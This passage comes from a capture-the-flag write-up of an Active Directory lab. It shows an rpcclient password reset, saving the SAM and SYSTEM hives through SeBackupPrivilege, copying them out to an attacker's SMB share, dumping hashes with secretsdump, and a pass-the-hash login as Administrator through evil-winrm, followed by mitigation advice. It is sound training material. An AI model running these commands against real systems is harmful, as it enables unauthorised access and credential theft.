SQL (HAERO\Hazel.Green  guest@master)>
```

The `Hazel.Green` and `Molly.Smith` is in the same group name, `IT`. The Molly.Smit user is a member of the `TIER1-ADMINS` group, which is a member of the `REMOTE DESKTOP USERS` group. It means a Molly.Smith user can connect to the system using the RDP service.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Hokkaido/screenshots/image1.png)

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Hokkaido/screenshots/image2.png)

Reset the `Molly.Smith` user’s password using the `rpcclient` tool and `hazel.green` ’s user.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ rpcclient -N  192.168.163.40 -U 'hazel.green%haze1988'
rpcclient $> setuserinfo2 MOLLY.SMITH 23 'Password123!'
rpcclient $> exit
```

## Initial Foothold

Using the `Molly.Smith` user, connect to the system and get the first user’s flag.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Hokkaido/screenshots/image3.png)

```
PS C:\> type local.txt
087fdf962f6d590137be598025850401
PS C:\> whoami
haero\molly.smith
PS C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::3522:abb5:40cc:9009%6
   IPv4 Address. . . . . . . . . . . : 192.168.163.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.163.254
```

## Privilege Escalation

Ran CMD as Administrator using `molly.smith:Password123!` and ran the `whoami /priv` command and found a `SeBackupPrivilege` user’s privilege, which can allow us to extract the SAM and SYSTEM files from the system.

```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeMachineAccountPrivilege     Add workstations to domain          Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled

C:\Windows\system32>whoami
haero\molly.smith

C:\Users\MOLLY.SMITH\Downloads>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\MOLLY.SMITH\Downloads> reg save HKLM\SAM SAM
The operation completed successfully.
PS C:\Users\MOLLY.SMITH\Downloads> reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.
PS C:\Users\MOLLY.SMITH\Downloads> net use m: \\192.168.45.170\smbshare /user:testuser testpassword
The command completed successfully.

PS C:\Users\MOLLY.SMITH\Downloads> copy SAM M:\
PS C:\Users\MOLLY.SMITH\Downloads> copy SYSTEM M:\
```

Tried to crack the SAM and SYSTEM files using the `impacket-secretsdump` tool and found an `administrator` user’s hash.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ impacket-secretsdump local -sam SAM -system SYSTEM
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Try to connect the `Administrator` user using the `evil-winrm` tool and get the Administrator flag on the domain controller.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ evil-winrm -i 192.168.163.40 -u 'Administrator' -H 'd752482897d54e239376fddb2a2109e4'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
haero\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\proof.txt
1cdf3b2270ef4d69e1d2e2bb20caaaaa
```

## Mitigation

- Enforce strong, non-reusable passwords for all domain and service accounts.
- Remove plaintext credentials and sensitive files from `NETLOGON`, `SYSVOL`, and user home directories.
- Ensure Kerberos pre-authentication is enabled for all user accounts.
- Regularly audit and restrict Service Principal Names and Kerberoasting exposure.
- Limit Active Directory permissions such as `GenericWrite`, `GenericAll`, and delegation rights to only required accounts.
- Use managed service accounts instead of static service credentials.
- Restrict SQL Server `IMPERSONATE` privileges and apply least-privilege access to databases.
- Monitor Kerberos, SMB, and SQL Server authentication events for abnormal activity.
- Periodically review SMB share permissions and remove unnecessary read/write access.

## Conclusion

The compromise was achieved by chaining together weak credentials, exposed domain shares, Kerberos abuse, and excessive Active Directory permissions. No exploitation of software vulnerabilities was required.

The attack path highlights how common configuration weaknesses across identity services, file shares, and application accounts can be combined to escalate access within a Windows domain environment. Proper credential handling, permission scoping, and routine security reviews would have prevented multiple stages of this attack chain.